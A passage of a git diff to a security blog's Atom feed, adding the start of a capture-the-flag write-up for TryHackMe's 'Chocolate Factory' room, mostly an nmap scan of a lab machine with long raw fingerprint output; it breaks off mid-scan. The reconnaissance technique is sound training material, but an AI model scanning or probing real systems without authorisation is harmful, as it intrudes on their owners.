@@ -1,4 +1,857 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="https://darrynbrownfield.co.uk/feed.xml" rel="self" type="application/atom+xml" /><link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" /><updated>2021-01-06T22:52:56+00:00</updated><id>https://darrynbrownfield.co.uk/</id><title type="html">Darryn Brownfield</title><subtitle>Infosec | Hacking | CTF</subtitle><entry><title type="html">Pickle Rick Write Up</title><link href="https://darrynbrownfield.co.uk/picklerick" rel="alternate" type="text/html" title="Pickle Rick Write Up" /><published>2021-01-06T00:00:00+00:00</published><updated>2021-01-06T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/picklerick</id><content type="html" xml:base="https://darrynbrownfield.co.uk/picklerick">&lt;p&gt;&lt;img src=&quot;/assets/images/picklerick/cover.png&quot; alt=&quot;picklerick&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="https://darrynbrownfield.co.uk/feed.xml" rel="self" type="application/atom+xml" /><link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" /><updated>2021-01-20T21:36:18+00:00</updated><id>https://darrynbrownfield.co.uk/</id><title type="html">Darryn Brownfield</title><subtitle>Infosec | Hacking | CTF</subtitle><entry><title type="html">Chocolate Factory CTF Write Up</title><link href="https://darrynbrownfield.co.uk/chocolatefactory" rel="alternate" type="text/html" title="Chocolate Factory CTF Write Up" /><published>2021-01-20T00:00:00+00:00</published><updated>2021-01-20T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/chocolatefactory</id><content type="html" xml:base="https://darrynbrownfield.co.uk/chocolatefactory">&lt;p&gt;&lt;img src=&quot;/assets/images/chocolatefactory/cover.png&quot; alt=&quot;chocolatefactory&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/chocolatefactory&quot;&gt;Chocolate Factory&lt;/a&gt; is a easy CTF room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt;.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;This room was designed so that hackers can revisit the Willy Wonka’s Chocolate Factory and meet Oompa Loompa&lt;/p&gt;
+
+  &lt;p&gt;This is a beginner friendly room!&lt;/p&gt;
+
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+
+&lt;p&gt;I deployed the machine and was given the target IP 10.10.224.249 I started a NMAP scan to check the available ports.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oN nmap/initial 10.10.224.249                                               
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-19 20:33 GMT
+Nmap scan report for 10.10.224.249                             
+Host is up (0.028s latency).                                   
+Not shown: 989 closed ports                                    
+PORT    STATE SERVICE    VERSION
+21/tcp  open  ftp        vsftpd 3.0.3
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-rw-r--    1 1000     1000       208838 Sep 30 14:31 gum_room.jpg
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:{Attacker IP}
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp  open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| ssh-hostkey: 
+|   2048 16:31:bb:b5:1f:cc:cc:12:14:8f:f0:d8:33:b0:08:9b (RSA)
+|   256 e7:1f:c9:db:3e:aa:44:b6:72:10:3c:ee:db:1d:33:90 (ECDSA)
+|_  256 b4:45:02:b6:24:8e:a9:06:5f:6c:79:44:8a:06:55:5e (ED25519)
+80/tcp  open  http       Apache httpd 2.4.29 ((Ubuntu))
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+100/tcp open  newacct?
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+106/tcp open  pop3pw?
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+109/tcp open  pop2?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+110/tcp open  pop3?
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+111/tcp open  rpcbind?
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   NULL, RPCCheck: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+113/tcp open  ident?
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, GetRequest, Help, LDAPSearchReq, NULL, TLSSessionReq, TerminalServerCookie, X11Probe: 
+|_    http://localhost/key_rev_key &amp;lt;- You will find the key here!!!
+119/tcp open  nntp?
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+125/tcp open  locus-map?
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+8 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port100-TCP:V=7.80%I=7%D=1/19%Time=60073A7E%P=x86_64-pc-linux-gnu%r(NUL
+SF:L,20F,&quot;\&quot;Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20__
+SF:_\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x2
+SF:0\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x2
+SF:0___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:
+SF:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\
+SF:'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\
+SF:n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x2
+SF:0\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`
+SF:\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20
+SF:\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|_________
+SF:_____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20M
+SF:r\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;
+SF:\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\&quot;\x20&quot;)%r(Gener
+SF:icLines,20F,&quot;\&quot;Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20
+SF:\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\
+SF:r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20_
+SF:___\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/
+SF:\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'
+SF:\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x2
+SF:0\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\
+SF:x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;------------
+SF:-----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x
+SF:20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|___
+SF:___________________;________________\|\r\n\r\nA\x20small\x20hint\x20fro
+SF:m\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here
+SF:!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\&quot;\x20&quot;);
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port106-TCP:V=7.80%I=7%D=1/19%Time=60073A7E%P=x86_64-pc-linux-gnu%r(NUL
+SF:L,20F,&quot;\&quot;Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20__
+SF:_\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x2
+SF:0\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x2
+SF:0___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:
+SF:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\
+SF:'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\
+SF:n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x2
+SF:0\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`
+SF:\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20
+SF:\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|_________
+SF:_____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20M
+SF:r\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;
+SF:\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\&quot;\x20&quot;)%r(Gener
+SF:icLines,20F,&quot;\&quot;Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20
+SF:\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\
+SF:r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20_
+SF:___\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/
+SF:\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'
+SF:\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x2
+SF:0\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\
+SF:x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;------------
+SF:-----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x
+SF:20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|___
+SF:___________________;________________\|\r\n\r\nA\x20small\x20hint\x20fro
+SF:m\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here
+SF:!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\&quot;\x20&quot;);
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port109-TCP:V=7.80%I=7%D=1/19%Time=60073A7E%P=x86_64-pc-linux-gnu%r(NUL
+SF:L,20F,&quot;\&quot;Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20__
+SF:_\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x2
+SF:0\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x2
+SF:0___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:
+SF:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\
+SF:'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\
+SF:n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x2
+SF:0\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`
+SF:\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20
+SF:\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|_________
+SF:_____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20M
+SF:r\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;
+SF:\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\&quot;\x20&quot;)%r(Gener
+SF:icLines,20F,&quot;\&quot;Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20
+SF:\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\
+SF:r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20_
+SF:___\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/
+SF:\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'
+SF:\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x2
+SF:0\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\
+SF:x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;------------
+SF:-----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x
+SF:20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|___
+SF:___________________;________________\|\r\n\r\nA\x20small\x20hint\x20fro
+SF:m\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here
+SF:!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\&quot;\x20&quot;);
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port110-TCP:V=7.80%I=7%D=1/19%Time=60073A7E%P=x86_64-pc-linux-gnu%r(NUL
+SF:L,20F,&quot;\&quot;Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20__
+SF:_\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x2
+SF:0\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x2
+SF:0___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:
+SF:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\
+SF:'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\
+SF:n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x2
+SF:0\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`
+SF:\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20
+SF:\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|_________
+SF:_____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20M
+SF:r\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;
+SF:\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\&quot;\x20&quot;)%r(Gener
+SF:icLines,20F,&quot;\&quot;Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20
+SF:\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\
+SF:r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20_
+SF:___\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/
+SF:\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'
+SF:\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x2
+SF:0\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\
+SF:x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;------------
+SF:-----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x
+SF:20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|___
+SF:___________________;________________\|\r\n\r\nA\x20small\x20hint\x20fro
+SF:m\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here
+SF:!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\&quot;\x20&quot;);
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port111-TCP:V=7.80%I=7%D=1/19%Time=60073A7E%P=x86_64-pc-linux-gnu%r(NUL
+SF:L,20F,&quot;\&quot;Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20__
+SF:_\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x2
+SF:0\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x2
+SF:0___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:
+SF:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\
+SF:'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\
+SF:n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x2
+SF:0\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`
+SF:\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20
+SF:\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|_________
+SF:_____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20M
+SF:r\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;
+SF:\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\&quot;\x20&quot;)%r(RPCCh
+SF:eck,20F,&quot;\&quot;Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20
+SF:___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\
+SF:x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\
+SF:x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20
+SF:_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__
+SF:\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\
+SF:r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\
+SF:x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;----------------
+SF:-`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x
+SF:20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|_______
+SF:_______________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x2
+SF:0Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x2
+SF:0;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\&quot;\x20&quot;);
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port113-TCP:V=7.80%I=7%D=1/19%Time=60073A7E%P=x86_64-pc-linux-gnu%r(NUL
+SF:L,3E,&quot;http://localhost/key_rev_key\x20&amp;lt;-\x20You\x20will\x20find\x20the\
+SF:x20key\x20here!!!\n&quot;)%r(GenericLines,3E,&quot;http://localhost/key_rev_key\x
+SF:20&amp;lt;-\x20You\x20will\x20find\x20the\x20key\x20here!!!\n&quot;)%r(GetRequest,3
+SF:E,&quot;http://localhost/key_rev_key\x20&amp;lt;-\x20You\x20will\x20find\x20the\x20
+SF:key\x20here!!!\n&quot;)%r(Help,3E,&quot;http://localhost/key_rev_key\x20&amp;lt;-\x20You
+SF:\x20will\x20find\x20the\x20key\x20here!!!\n&quot;)%r(TerminalServerCookie,3E
+SF:,&quot;http://localhost/key_rev_key\x20&amp;lt;-\x20You\x20will\x20find\x20the\x20k
+SF:ey\x20here!!!\n&quot;)%r(TLSSessionReq,3E,&quot;http://localhost/key_rev_key\x20&amp;lt;
+SF:-\x20You\x20will\x20find\x20the\x20key\x20here!!!\n&quot;)%r(X11Probe,3E,&quot;ht
+SF:tp://localhost/key_rev_key\x20&amp;lt;-\x20You\x20will\x20find\x20the\x20key\x
+SF:20here!!!\n&quot;)%r(LDAPSearchReq,3E,&quot;http://localhost/key_rev_key\x20&amp;lt;-\x2
+SF:0You\x20will\x20find\x20the\x20key\x20here!!!\n&quot;);
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port119-TCP:V=7.80%I=7%D=1/19%Time=60073A7E%P=x86_64-pc-linux-gnu%r(NUL
+SF:L,20F,&quot;\&quot;Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20__
+SF:_\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x2
+SF:0\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x2
+SF:0___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:
+SF:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\
+SF:'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\
+SF:n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x2
+SF:0\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`
+SF:\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20
+SF:\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
